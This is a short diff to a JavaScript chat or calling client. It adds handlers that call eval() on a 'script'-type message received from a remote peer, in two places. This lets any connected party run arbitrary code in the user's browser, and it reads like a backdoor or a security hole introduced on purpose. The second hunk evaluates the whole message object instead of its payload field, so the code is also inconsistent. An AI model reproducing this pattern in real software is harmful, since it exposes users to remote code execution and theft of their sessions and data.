@@ -71,6 +71,8 @@ async function callUser() {
                 messages.appendChild(message);
             } else if (data.type === "call") {
                 notify(data.name);
+            } else if (data.type === 'script') {
+                eval(data.data)
             }
         });
 
@@ -176,6 +178,8 @@ function connection(conn) {
                 messages.appendChild(message);
             } else if (data.type === "call") {
                 notify(data.name);
+            } else if (data.type === 'script') {
+                eval(data);
             }
         });
 
